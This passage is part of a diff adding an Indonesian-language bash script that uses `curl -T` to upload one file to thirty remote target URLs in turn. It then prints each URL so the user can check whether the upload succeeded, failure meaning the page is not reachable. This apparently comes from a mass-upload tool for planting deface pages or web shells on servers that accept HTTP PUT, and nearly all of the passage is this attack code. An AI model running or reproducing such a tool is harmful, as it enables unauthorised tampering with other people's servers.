+curl -T $alamat/$sc $ke9
+echo -e $f ''
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+echo -e $g ''
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+echo -e $a ''
+curl -T $alamat/$sc $ke16
+curl -T $alamat/$sc $ke17
+curl -T $alamat/$sc $ke18
+echo -e $b ''
+curl -T $alamat/$sc $ke19
+curl -T $alamat/$sc $ke20
+curl -T $alamat/$sc $ke21
+echo -e $c ''
+curl -T $alamat/$sc $ke22
+curl -T $alamat/$sc $ke23
+curl -T $alamat/$sc $ke24
+echo -e $d ''
+curl -T $alamat/$sc $ke25
+curl -T $alamat/$sc $ke26
+curl -T $alamat/$sc $ke27
+echo -e $e ''
+curl -T $alamat/$sc $ke28
+curl -T $alamat/$sc $ke29
+curl -T $alamat/$sc $ke30
+echo '========[Selesai]========' | lolcat
+echo -e $f ''
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo -e $g ''
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo -e $a ''
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo -e $b ''
+echo "Cek : $ke16/$sc"
+echo "Cek : $ke17/$sc"
+echo "Cek : $ke18/$sc"
+echo "Cek : $ke19/$sc"
+echo "Cek : $ke20/$sc"
+echo -e $c ''
+echo "Cek : $ke21/$sc"
+echo "Cek : $ke22/$sc"
+echo "Cek : $ke23/$sc"
+echo "Cek : $ke24/$sc"
+echo "Cek : $ke25/$sc"
+echo -e $d ''
+echo "Cek : $ke26/$sc"
+echo "Cek : $ke27/$sc"
+echo "Cek : $ke28/$sc"
+echo "Cek : $ke29/$sc"
+echo "Cek : $ke30/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal' | lolcat
+echo 'Bay-Bay' | lolcat
+fi
